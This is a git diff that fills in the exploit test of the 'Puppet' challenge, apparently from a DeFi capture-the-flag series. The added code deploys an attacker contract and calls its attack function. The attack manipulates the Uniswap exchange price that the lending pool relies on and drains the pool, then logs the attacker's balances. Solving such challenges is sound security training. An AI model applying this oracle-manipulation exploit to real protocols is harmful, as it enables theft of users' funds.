@@ -137,6 +137,53 @@ describe('[Challenge] Puppet', function () {
 
   it('Exploit', async function () {
     /** CODE YOUR EXPLOIT HERE */
+    const ethAmount = await ethers.provider.getBalance(
+      this.uniswapExchange.address
+    );
+    console.log('ethAmount: ', ethers.utils.formatEther(ethAmount));
+    const maxCost = await this.uniswapExchange.getTokenToEthOutputPrice(
+      ethAmount.sub(1),
+      { gasLimit: 1e6 }
+    );
+    console.log('maxCost: ', ethers.utils.formatEther(maxCost));
+    const cost = maxCost.gt(ATTACKER_INITIAL_TOKEN_BALANCE)
+      ? ATTACKER_INITIAL_TOKEN_BALANCE.sub(1)
+      : maxCost.sub(1);
+    console.log('cost: ', ethers.utils.formatEther(cost));
+    const userEthBefore = await ethers.provider.getBalance(attacker.address);
+    console.log('user eth before: ', ethers.utils.formatEther(userEthBefore));
+    const PuppetAttackerFactory = await ethers.getContractFactory(
+      'PuppetAttacker',
+      attacker
+    );
+    const puppetAttacker = await PuppetAttackerFactory.deploy();
+    await (
+      await this.token.connect(attacker).approve(puppetAttacker.address, cost)
+    ).wait();
+    await (
+      await puppetAttacker
+        .connect(attacker)
+        .attack(
+          this.lendingPool.address,
+          this.uniswapExchange.address,
+          this.token.address,
+          cost,
+          {
+            value: (
+              await ethers.provider.getBalance(attacker.address)
+            ).sub(ethers.utils.parseEther('0.1')),
+          }
+        )
+    ).wait();
+
+    console.log(`\nfinal balances:
+    [ETH] ${ethers.utils.formatEther(
+      await ethers.provider.getBalance(attacker.address)
+    )}
+    [DVT] ${ethers.utils.formatUnits(
+      await this.token.balanceOf(attacker.address),
+      await this.token.decimals()
+    )}`);
   });
 
   after(async function () {
